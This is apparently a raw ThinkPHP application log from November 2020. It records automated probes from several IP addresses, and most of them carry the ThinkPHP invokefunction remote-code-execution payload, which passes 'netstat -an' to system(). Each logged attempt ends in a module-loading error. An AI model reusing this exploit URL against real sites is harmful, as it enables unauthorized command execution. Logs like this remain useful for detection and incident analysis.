[ 2020-11-19T11:14:09+08:00 ] 47.97.67.75 /index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2020-11-19T11:14:09+08:00 ] 47.97.67.75 /index.php/?s=/user/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:User

[ 2020-11-19T11:14:09+08:00 ] 47.97.67.75 /index.php/?s=/install/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Install

[ 2020-11-19T12:13:32+08:00 ] 47.97.67.75 /index.php?s=captcha
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Captcha

[ 2020-11-19T15:17:13+08:00 ] 116.62.107.61 /index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2020-11-19T15:17:13+08:00 ] 116.62.107.61 /index.php/?s=/user/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:User

[ 2020-11-19T15:17:13+08:00 ] 116.62.107.61 /index.php/?s=/install/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Install

[ 2020-11-19T16:17:33+08:00 ] 47.97.66.35 /index.php?s=captcha
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Captcha

